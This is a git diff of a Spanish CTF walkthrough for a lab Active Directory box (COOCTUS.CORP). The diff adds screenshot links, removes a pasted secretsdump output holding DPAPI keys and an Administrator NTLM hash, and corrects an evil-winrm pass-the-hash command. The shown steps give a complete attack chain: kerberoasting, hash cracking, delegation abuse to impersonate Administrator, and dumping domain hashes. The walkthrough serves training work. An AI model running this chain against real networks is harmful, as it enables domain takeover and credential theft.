@@ -203,10 +203,14 @@ haremos un `impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.10
 para ver si podemos encontrar una cuenta de servicio para abusar.
 
 si hacen un `cat TGS.txt` veran que nos dejo un HASH, intentemos romperlo con John The Ripper.
+
+![Ticket TGS.txt](TGS.png)
  
 haremos un  `john TGS.txt -w=/usr/share/wordlists/rockyou.txt`
 
 Nota: es probable que el diccionario este comprimido asi que te tendras que ir ala ruta /usr/share/wordlists/ y haras un gzip -d rockyou.txt y con eso ya funcionaria bien si es que en caso no lo hayas descomprimido antes.
+
+![Usando John The Ripper para romper el HASH.](john.png)
 
 y ahi estara las contraseña: `resetpassword`
 
@@ -214,10 +218,14 @@ ahora haremos un:
 
 `impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.206.226`
 
+![Extracion sobre informacion de la delegación.](find.png)
+
 para el uso de la delegación de búsqueda de impacket para extraer más información sobre la delegación.
  
  ahora haremos un 
  `impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.206.226`
+
+![ ticket de servicio para el usuario administrador](getST.png)
 
 El resultado de este script será un ticket de servicio para el usuario administrador.
 Una vez que tengamos el archivo ccache, configúrelo en la variable KRB5CCNAME para que se cargue dentro de la memoria y luego podamos usarlo a nuestro favor.
@@ -241,47 +249,39 @@ ahora haremos un `impacket-secretsdump -k -no-pass DC.COOCTUS.CORP`
 
 Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del usuario.
 
-el hash que colocaras tendria que ser este:
+el hash que colocaras tendria que ser como este:
 
-```yam
-[*] DPAPI_SYSTEM 
-dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
-dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
-[*] NL$KM 
- 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
- 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
- 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
- 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
-NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
-```
+![Hash](hash.png)
+
 #### Post Explotacion:
 
 en la parte donde dice Administrador seleccionaran el hash que empieza con add, esta el que inicia con aad pero no, ustedes usaran el que dice add
 
 ahora para lograr obtener una shell como administrador lo que haremos sera
  
-`evil-winrm -i 10.10.206.226 -u Administrator -H aad3b435b51404eeaad3b435b51404ee`
+`evil-winrm -i 10.10.206.226 -u Administrator -H 'add41095f1fb0405b32f70a489de022d'`
 
 `-i` hace referencia a IP `-u` hace referencia a Usuario `-H` hace refencia a HASH
 
 #### Escalada De Privilegios:
 
-comenzaremos con una busqueda rapida a los archivos txt y user.
+comenzaremos con una busqueda rapida a los archivos `txt` y `user.`
 
 `Get-Childitem -Path C:\ -Include *user*.txt* -File -Recurse -ErrorAction SilentlyContinue`
+
+![Busqueda a nivel / de banders user.txt](privesc.png)
 
 como ven nos deja un directorio llamado `C:\Shares\Home entremos con cd C:\PerfLogs\Admin` y hagamos un dir y como vemos ahi estan las 2 flags mas que necesitabamos, la user.txt ya la habiamos sacado con smbmap...
 
 haremos una busqueda a nivel raiz para la bandera `root.txt`
 
-`Get-Childitem -Path / -Include root.txt -File -Recurse -ErrorAction SilentlyContinue` 
+`Get-Childitem -Path / -Include root.txt -File -Recurse -ErrorAction SilentlyContinue`
+
+![Busqueda a nivel / de la ultima bandera "root.txt"](root.png) 
 
 como ven nos tiro esta ruta >>> `C:\PerfLogs\Admin entremos con cd C:\PerfLogs\Admin`
 
-hacemos un type root.txt y ahi estaria la bandera root, y con eso estaria terminada la ctf, espero que les haya agradado el video y cualquier duda o error que tengan en cualquiera de las ctfs que suba al canal me pueden preguntar por privado, me encuentran como @samsepiol en la plataforma de telegram.
+hacemos un `type root.txt` y ahi estaria la bandera root, y con eso estaria terminada la ctf, espero que les haya agradado el video y cualquier duda o error que tengan en cualquiera de las ctfs que suba al canal me pueden preguntar por privado, me encuentran como @samsepiol en la plataforma de telegram.
 
 Link [My Community](https://t.me/Un0zandC3r0z).
 
